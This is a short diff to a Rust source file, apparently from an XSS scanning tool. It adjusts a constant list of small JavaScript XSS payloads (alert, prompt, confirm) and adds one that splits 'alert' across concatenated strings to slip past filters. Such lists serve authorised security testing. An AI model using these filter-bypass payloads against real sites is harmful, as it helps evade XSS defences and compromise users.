@@ -1,11 +1,12 @@
 // inHTML, inAttr, ETC
 pub const XSS_JAVASCRIPT_PAYLOADS_SMALL: &[&str] = &[
-    "alert(1)",        // alert
-    "prompt`1`",       // prompt with backtick
-    "confirm(1)",      // confirm
-    "(_=prompt,_(1))", // prompt with bypass technique
-    "(((confirm)))``", // confirm with bypass technique
-    "[2].find(alert)", // alert with bypass technique
+    "alert(1)",                 // alert
+    "prompt`1`",                // prompt with backtick
+    "confirm(1)",               // confirm
+    "(_=prompt,_(1))",          // prompt with bypass technique
+    "(((confirm)))``",          // confirm with bypass technique
+    "[2].find(alert)",          // alert with bypass technique
+    "top[\"al\"+\"\\ert\"](1)", // alert with bypass technique2
 ];
 
 // for inJS
